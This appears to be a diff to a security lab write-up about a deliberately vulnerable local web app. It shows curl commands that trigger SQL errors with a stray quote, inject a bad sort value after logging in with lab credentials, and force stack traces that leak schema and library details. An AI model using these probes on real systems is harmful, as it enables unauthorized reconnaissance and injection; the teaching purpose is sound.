@@ -6,23 +6,34 @@
 
 **Code:** `config.js` (`debug`), `server.js` (error handler), `routes/shop.js` (`/search`), `views/error.ejs`, `views/products.ejs`
 
-## Exploit 1: SQL error on the page
+## Exploit
+
+1. Trigger a SQL error from the (public) search page — no login needed:
 
 ```bash
-curl -s -b cookies.txt "http://localhost:8888/search?q='" | grep -A2 "Query error"
+curl -s "http://localhost:8888/search?q='" | grep -A2 "Query error"
 # <pre>unterminated quoted string at or near "''%'" ...
 ```
 
 The query text leaks schema details and confirms injection (lab 03).
 
-## Exploit 2: stack traces
+2. Get a stack trace from the sort injection:
 
 ```bash
+curl -s -c cookies.txt -X POST http://localhost:8888/login/auth \
+  -d "username=alice" -d "password=alice123"      # orders need a session
+
 curl -s -b cookies.txt "http://localhost:8888/orders?sort=nope" | grep -m1 "pg-pool"
 # at /app/node_modules/pg-pool/index.js:45:11 ...
 ```
 
 Internal paths, library versions, and driver internals — everything an attacker needs to map the stack.
+
+3. Trigger a 500 with a stack trace on a public page:
+
+```bash
+curl -s "http://localhost:8888/products/notanumber" | grep -m1 "error-box"
+```
 
 ## Why it happens
 
